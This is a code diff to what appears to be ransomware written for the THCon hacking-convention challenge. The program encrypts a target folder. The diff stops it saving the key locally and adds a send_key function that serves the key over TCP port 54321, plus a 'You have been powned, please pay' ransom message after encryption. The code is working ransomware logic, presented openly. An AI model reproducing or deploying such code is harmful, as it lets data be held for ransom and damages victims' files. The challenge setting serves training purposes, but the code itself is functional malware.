@@ -1,6 +1,10 @@
 #include <stdio.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
 #include <dirent.h>
 #include <errno.h>
 #include "crypto.h"
@@ -11,7 +15,7 @@
 
 void help_text(char *name)
 {
-    printf("Usage: %s -e | --encrypt | -d | --decrypt [keyfile]\n", name);
+    printf("Usage: %s -e | --encrypt | -d | --decrypt keyfile\n", name);
     printf("This software should not be used outside of the THCon challenge.\n");
     printf("The Toulouse Hacking Convention is not responsible for the use of this software.\n");
 }
@@ -44,20 +48,16 @@ int cmdline_parse(int argc, char *argv[], enum action *action, char *keyfile)
         }
 
         /* Parse arguments. */
-        if ((strcmp(argv[1], "--encrypt") == 0) || (strcmp(argv[1], "-e") == 0))
+        if ((argc == 2) && ((strcmp(argv[1], "--encrypt") == 0) || (strcmp(argv[1], "-e") == 0)))
         {
             /* Encrypt target folder using a random key. */
             *action = ENCRYPT;
-            if (argc == 3) strncpy(keyfile, argv[2], PATH_LENGTH);
-            else strncpy(keyfile, DEFAULT_KEY_PATH, PATH_LENGTH);
-            keyfile[PATH_LENGTH-1] = '\0';
         }
-        else if ((strcmp(argv[1], "--decrypt") == 0) || (strcmp(argv[1], "-d") == 0))
+        else if ((argc == 3) && ((strcmp(argv[1], "--decrypt") == 0) || (strcmp(argv[1], "-d") == 0)))
         {
             /* Decrypt target folder using key from stdin. */
             *action = DECRYPT;
-            if (argc == 3) strncpy(keyfile, argv[2], PATH_LENGTH);
-            else strncpy(keyfile, DEFAULT_KEY_PATH, PATH_LENGTH);
+            strncpy(keyfile, argv[2], PATH_LENGTH);
             keyfile[PATH_LENGTH-1] = '\0';
         }
         else if ((argc == 2) && ((strcmp(argv[1], "--help") == 0) || (strcmp(argv[1], "-h") == 0)))
@@ -87,23 +87,12 @@ int cmdline_parse(int argc, char *argv[], enum action *action, char *keyfile)
 void initialise_key(enum action action, char *keyfile, unsigned char *key)
 {
     int key_fd;
+    int size;
     switch (action)
     {
         case ENCRYPT:
             /* Generate a random 256 bit key. */
             if (!get_random_bytes(key, KEY_SIZE)) handleErrors();
-            key_fd = open(keyfile, O_WRONLY | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
-            if (key_fd < 0)
-            {
-                perror("[Encryption] Error opening key file");
-                abort();
-            }
-            if (write(key_fd, key, KEY_SIZE) != KEY_SIZE)
-            {
-                perror("[Encryption] Error writing key to key file");
-                abort();
-            }
-            close(key_fd);
             break;
 
         case DECRYPT:
@@ -113,9 +102,9 @@ void initialise_key(enum action action, char *keyfile, unsigned char *key)
                 perror("[Decryption] Error opening key file");
                 abort();
             }
-            if (read(key_fd, key, KEY_SIZE) != KEY_SIZE)
+            if ((size = read(key_fd, key, KEY_SIZE)) != KEY_SIZE)
             {
-                perror("[Decryption] Error reading key from key file");
+                printf("[Decryption] Error reading key from key file, bad key size (%d), should be %d.\n", size, KEY_SIZE);
                 abort();
             }
             close(key_fd);
@@ -126,6 +115,53 @@ void initialise_key(enum action action, char *keyfile, unsigned char *key)
             abort();
             break;
     };
+}
+
+
+/* Send the key to a remote server (here the hypervisor). */
+int send_key(unsigned char *key)
+{
+    int sockfd, portno, n, clientfd, c;
+    struct sockaddr_in serveraddr;
+    struct sockaddr_in clientaddr;
+
+    portno = atoi("54321");
+
+    /* socket: create the socket */
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0)
+        error("ERROR opening socket");
+
+    /* build the server's Internet address */
+    bzero((char *) &serveraddr, sizeof(serveraddr));
+    serveraddr.sin_family = AF_INET;
+    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    serveraddr.sin_port = htons(portno);
+
+    if (bind(sockfd, (struct sockaddr *) &serveraddr, sizeof(serveraddr)) < 0)
+        error("ERROR binding");
+
+    if (listen(sockfd, 1) < 0)
+        error("ERROR listening");
+
+    printf("Listening on port 54321, waiting for incoming connexion!\n");
+
+    c = sizeof(clientaddr);
+    if ((clientfd = accept(sockfd, (struct sockaddr *) &clientaddr, (socklen_t*)&c)) < 0)
+    {
+        error("ERROR accepting");
+        exit(1);
+    }
+
+    /* send the message line to the server */
+    n = write(clientfd, key, KEY_SIZE);
+    if (n != KEY_SIZE)
+        error("ERROR writing to socket");
+    printf("OK\n");
+
+    close(clientfd);
+    close(sockfd);
+    return 0;
 }
 
 /*
@@ -154,6 +190,7 @@ int main(int argc, char *argv[])
     printf("Target folder: %s\n", target_folder);
 
     keyfile = (char *) malloc(PATH_LENGTH*sizeof(char));
+    bzero(keyfile, PATH_LENGTH);
 
     int res;
     if ((res = cmdline_parse(argc, argv, &action, keyfile)) <= 0) exit(-res);
@@ -174,6 +211,7 @@ int main(int argc, char *argv[])
     /* In case of encryption, keep the program running. */
     if (action == ENCRYPT)
     {
+        send_key(key);
         printf("You have been powned, please pay in order to get your data back!\n");
         while (1)
         {
